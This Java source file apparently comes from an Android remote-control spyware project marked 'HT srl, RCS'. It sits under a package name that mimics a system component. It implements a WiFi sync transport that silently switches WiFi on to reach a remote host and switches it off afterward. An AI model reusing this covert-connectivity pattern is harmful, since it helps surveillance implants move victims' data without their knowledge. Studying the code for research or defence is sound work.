/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : WifiTransport.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.action.sync;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;

import com.android.deviceinfo.Device;
import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.Utils;

/**
 * The Class WifiTransport.
 */
public class WifiTransport extends HttpKeepAliveTransport {
	private static final String TAG = "WifiTransport"; //$NON-NLS-1$
	/** The forced. */
	private boolean forced;
	private boolean switchedOn;

	// final String service = Context.WIFI_SERVICE;
	final WifiManager wifi = (WifiManager) Status.getAppContext().getSystemService(Context.WIFI_SERVICE);
	private final ConnectivityManager connManager = (ConnectivityManager) Status.getAppContext().getSystemService(
			Context.CONNECTIVITY_SERVICE);
	private int ip;

	/**
	 * Instantiates a new wifi transport.
	 * 
	 * @param host
	 *            the host
	 */
	public WifiTransport(final String host) {
		super(host);
	}

	/**
	 * Instantiates a new wifi transport.
	 * 
	 * @param host
	 *            the host
	 * @param wifiForced
	 *            the wifi forced
	 */
	public WifiTransport(final String host, final boolean wifiForced) {
		super(host);
		// this.ip = lookupHost(host);
		this.forced = wifiForced;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.sync.Transport#isAvailable()
	 */
	@Override
	public boolean isAvailable() {
		if (Device.self().isSimulator()) {
			return true;
		}

		//NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
		//boolean available = mWifi.isAvailable() && /*mWifi.isConnected()*/ mWifi.isConnectedOrConnecting();
		boolean available = Status.wifiConnected;
		
		if (available) {
			connManager.setNetworkPreference(ConnectivityManager.TYPE_WIFI);
		}

		return available;
	}

	@Override
	public void enable() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (enable): forced: " + forced + " wifiState: " + wifi.getWifiState()); //$NON-NLS-1$
		}

		if (forced == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (enable): wifi connectivity won't be forced, force flag is disabled"); //$NON-NLS-1$
			}
			
			return;
		}
		
		// wifi.reconnect();
		// wifi.reassociate();
		// ConnectivityManager.setNetworkPrefrence(ConnectivityManager.TYPE_WIFI)
		if (wifi.getWifiState() == WifiManager.WIFI_STATE_ENABLED || wifi.getWifiState() == WifiManager.WIFI_STATE_ENABLING) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (enable): wifi already on, forcing not required"); //$NON-NLS-1$
			}

			return;
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (enable): trying to enable wifi");//$NON-NLS-1$
		}

		switchedOn = wifi.setWifiEnabled(true);

		if (switchedOn == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (enable): cannot enable WiFi interface"); //$NON-NLS-1$
			}
		}

		for (int i = 0; i < 20; i++) {
			if (isAvailable()) {
				break;
			}

			Utils.sleep(1000);
		}
	}

	@Override
	public void close() {
		super.close();

		if (switchedOn) {
			wifi.setWifiEnabled(false);
			switchedOn = false;
		}
	}
}
